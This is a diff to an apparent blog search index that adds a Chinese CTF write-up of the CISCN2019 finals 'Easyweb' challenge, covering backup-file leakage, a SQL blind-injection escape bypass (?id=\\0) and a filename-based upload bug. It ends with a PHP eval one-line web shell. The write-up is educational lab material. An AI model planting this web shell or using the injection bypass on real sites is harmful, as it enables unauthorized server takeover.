@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>刷题笔记:Easyweb[CISCN2019 总决赛 Day2 Web1]</title>
+      <link href="/p/1768082624.html"/>
+      <url>/p/1768082624.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="刷题笔记-Easyweb-CISCN2019-总决赛-Day2-Web1"><a href="#刷题笔记-Easyweb-CISCN2019-总决赛-Day2-Web1" class="headerlink" title="刷题笔记:Easyweb[CISCN2019 总决赛 Day2 Web1]"></a>刷题笔记:Easyweb[CISCN2019 总决赛 Day2 Web1]</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>着实惭愧，这题一年前还做过，今天再做，得，忘得一干二净。</p><p>写好的脚本一打开，payload都是原封不动了，尴尬。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Easyweb-CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1.assets/image-20210704234624409.png"></p><p>截个图，写个关键字，方便日后检索：[猫图|猫头|猫猫]</p><p>这题主要三个考点：1.备份文件泄漏；2.SQL盲注；3.文件上传</p><h3 id="1-备份文件泄漏"><a href="#1-备份文件泄漏" class="headerlink" title="1.备份文件泄漏"></a>1.备份文件泄漏</h3><p>扫下目录，有robots.txt</p><p>提示是*.php.bak</p><p>扫到是/image.php.bak</p><h3 id="2-SQL盲注"><a href="#2-SQL盲注" class="headerlink" title="2.SQL盲注"></a>2.SQL盲注</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>像这种单引号+转义单引号都被过滤，然后又有过滤其他字符情况下。可以考虑套娃转义。<br>比如<code>\0</code>被输入到字符串中，<code>addslashes()</code>添加反斜杠变成<code>\\0</code>,又会被<code>str_replace()</code>转义成<code>\</code>，这样就构造成<code>\&#39;</code>，就能把单引号转义了。</p><p>注意，在输入的时候还得把<code>\0</code>转义，所以是<code>?id=\\0</code></p><p>这样看太抽象，我还琢磨了好久，扔到navicat一下就明白了。</p><p><img src="%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Easyweb-CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1.assets/image-20210705000044013.png"></p><p>然后测试一波payload,搞清楚盲注逻辑，套到脚本里跑，拿到admin的密码(无需解md5。这题不知道为什么跑起来真的慢</p><h3 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3.文件上传"></a>3.文件上传</h3><p>漏洞在文件名处，会将文件名写入到log.php里，又因为检测php字符串，所以一句话木马用短标签</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> Web </tag>
+            
+            <tag> if+substr盲注 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>微信小程序学习笔记</title>
       <link href="/p/4251616546.html"/>
       <url>/p/4251616546.html</url>
